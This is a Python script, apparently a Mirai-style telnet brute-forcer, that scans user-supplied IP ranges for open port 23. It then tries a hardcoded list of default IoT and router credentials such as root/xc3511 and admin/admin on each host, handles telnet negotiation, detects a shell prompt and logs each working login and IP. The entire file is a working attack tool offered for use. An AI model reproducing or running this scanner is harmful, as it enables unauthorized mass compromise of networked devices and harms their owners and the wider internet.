r"""
    From @Locidol with love <3
"""
#!/usr/bin/python

import socket
from threading import Thread
import sys
from netaddr import IPNetwork
import logging
import os


logging.basicConfig(filename='data.log', level=logging.DEBUG)


dic = {
    "root":
    [
        "vizxv",
        "xc3511",
        "888888",
        "xmhdipc",
        "default",
        "juantech",
        "123456",
        "54321",
        "",
        "root",
        "12345",
        "pass",
        "1111",
        "666666",
        "password",
        "1234",
        "klv123",
        "klv1234",
        "Zte521",
        "hi3518",
        "jvbzd",
        "anko",
        "zlxx",
        "system",
        "ikwb",
        "dreambox",
        "user",
        "realtek",
        "00000000",
    ],
    "admin":
    [
        "root",
        "zoomadsl",
        "",
        "password",
        "admin",
        "admin1234",
        "smcadmin",
        "1111",
        "12345678",
        "1234",
        "12345",
        "54321",
        "123456",
        "4321",
        "pass",
        "meinsm",
    ],
    "support":
    [
        "support",
    ],
    "user":
    [
        "user",
    ],
    "supervisor":
    [
        "supervisor",
    ],
    "tech":
    [
        "tech",
    ],
    "administrator":
    [
        "1234",
    ],
    "vodafone":
    [
        "vodafone",
    ]
}

# Telnet protocol get from telnetlib characters (don't change)
IAC = chr(255)  # "Interpret As Command"
DONT = chr(254)
DO = chr(253)
WONT = chr(252)
WILL = chr(251)
theNULL = chr(0)

SE = chr(240)  # Subnegotiation End
NOP = chr(241)  # No Operation
DM = chr(242)  # Data Mark
BRK = chr(243)  # Break
IP = chr(244)   # Interrupt process
AO = chr(245)   # Abort output
AYT = chr(246)  # Are You There
EC = chr(247)  # Erase Character
EL = chr(248)  # Erase Line
G = chr(249)  # Go Ahead
SB = chr(250)  # Subnegotiation Begin


# Telnet protocol options code (don't change)
# These ones all come from arpa/telnet.h
BINARY = chr(0)  # 8-bit data path
ECHO = chr(1)  # echo
RCP = chr(2)  # prepare to reconnect
SGA = chr(3)  # suppress go ahead
NAMS = chr(4)  # approximate message size
STATUS = chr(5)  # give status
TM = chr(6)  # timing mark
RCTE = chr(7)  # remote controlled transmission and echo
NAOL = chr(8)  # negotiate about output line width
NAOP = chr(9)  # negotiate about output page size
NAOCRD = chr(10)  # negotiate about CR disposition
NAOHTS = chr(11)  # negotiate about horizontal tabstops
NAOHTD = chr(12)  # negotiate about horizontal tab disposition
NAOFFD = chr(13)  # negotiate about formfeed disposition
NAOVTS = chr(14)  # negotiate about vertical tab stops
NAOVTD = chr(15)  # negotiate about vertical tab disposition
NAOLFD = chr(16)  # negotiate about output LF disposition
XASCII = chr(17)  # extended ascii character set
LOGOUT = chr(18)  # force logout
BM = chr(19)  # byte macro
DET = chr(20)  # data entry terminal
SUPDUP = chr(21)  # supdup protocol
SUPDUPOUTPUT = chr(22)  # supdup output
SNDLOC = chr(23)  # send location
TTYPE = chr(24)  # terminal type
EOR = chr(25)  # end or record
TUID = chr(26)  # TACACS user identification
OUTMRK = chr(27)  # output marking
TTYLOC = chr(28)  # terminal location number
VT3270REGIME = chr(29)  # 3270 regime
X3PAD = chr(30)  # X.3 PAD
NAWS = chr(31)  # window size
TSPEED = chr(32)  # terminal speed
LFLOW = chr(33)  # remote flow control
LINEMODE = chr(34)  # Linemode option
XDISPLOC = chr(35)  # X Display Location
OLD_ENVIRON = chr(36)  # Old - Environment variables
AUTHENTICATION = chr(37)  # Authenticate
ENCRYPT = chr(38)  # Encryption option
NEW_ENVIRON = chr(39)  # New - Environment variables

TN3270E = chr(40)  # TN3270E
XAUTH = chr(41)  # XAUTH
CHARSET = chr(42)  # CHARSET
RSP = chr(43)  # Telnet Remote Serial Port
COM_PORT_OPTION = chr(44)  # Com Port Control Option
SUPPRESS_LOCAL_ECHO = chr(45)  # Telnet Suppress Local Echo
TLS = chr(46)  # Telnet Start TLS
KERMIT = chr(47)  # KERMIT
SEND_URL = chr(48)  # SEND-URL
FORWARD_X = chr(49)  # FORWARD_X
PRAGMA_LOGON = chr(138)  # TELOPT PRAGMA LOGON
SSPI_LOGON = chr(139)  # TELOPT SSPI LOGON
PRAGMA_HEARTBEAT = chr(140)  # TELOPT PRAGMA HEARTBEAT

data = ""


def is_alive(ip):
    return os.system("ping -w 1 " + ip + ">> /dev/null") is 0


def is_open_port_23(ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1.5)
    try:
        result = sock.connect_ex((ip, 23))
        sock.close()
        return not result
    except Exception, b:
        logging.debug(str(b) + ip)
        return False


def commandControl(sock, data):
    if data[1] and data[2] and [data[0], data[1], data[2]] == [IAC, DO, NAWS]:
        res_msg = IAC + WILL + NAWS + IAC + SB + NAMS + theNULL + chr(80) + theNULL + TTYPE + IAC + SE
        sock.send(res_msg)
        return

    data = list(data)
    for i in range(len(data)):
        if data[i] == DO:
            data[i] = WONT
        if data[i] == WILL:
            data[i] = DO
    res_msg = ''.join(data)
    sock.send(res_msg)
    return


def prompt_IAC(data):
    if data and data[0] == IAC:
        return True
    return False


def prompt_reply_user(user, data):
    if user == data:
        return True
    return False


def prompt_login(data):
    if "ogin:" in data:
        return True
    if "name:" in data:
        return True
    return False


def prompt_password(data):
    if "word:" in data:
        return True
    return False


def prompt_end_password(data):
    if data == "\r\n":
        return True
    return False


def prompt_shell(data):
    if data and data[-1:] == ">":
        return True
    if data and data[-1:] == "#":
        return True
    if data and data[-1:] == "\%":
        return True
    if data and data[-1:] == "$":
        return True
    if data and data[-2:] == "> ":
        return True
    if data and data[-2:] == "# ":
        return True
    if data and data[-2:] == "\% ":
        return True
    if data and data[-2:] == "$ ":
        return True
    return False


def optimus(ip):

    for key, values in dic.items():
        for value in values:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, 23))
                s.settimeout(60)

                while True:
                    data = s.recv(4096)
                    if not data:
                        break
                    else:
                        if prompt_IAC(data):
                            commandControl(s, data)
                            continue
                        elif prompt_login(data):
                            s.send(key + "\r\n")
                            continue
                        elif prompt_reply_user(key + "\r\n", data):
                            continue
                        elif prompt_password(data):
                            s.send(value + "\r\n")
                            continue
                        elif prompt_end_password(data):
                            continue
                        elif prompt_shell(data):
                            logging.info(key + ":" + value + "@" + ip)
                            sys.exit()
                        else:
                            break
            except:
                pass


threads = []

with open(sys.argv[1]) as f:
    lines = f.readlines()
    for line in lines:
        net = IPNetwork(line.strip())
        for ip in net:
            ip = str(ip)
            # if not is_alive(ip):
            #     continue
            # logging.debug("*")

            if not is_open_port_23(ip):
                continue
            logging.debug("O: " + ip)

            p = Thread(target=optimus, args=[ip])
            p.daemon = True
            threads.append(p)
            p.start()
for i in threads:
    i.join()
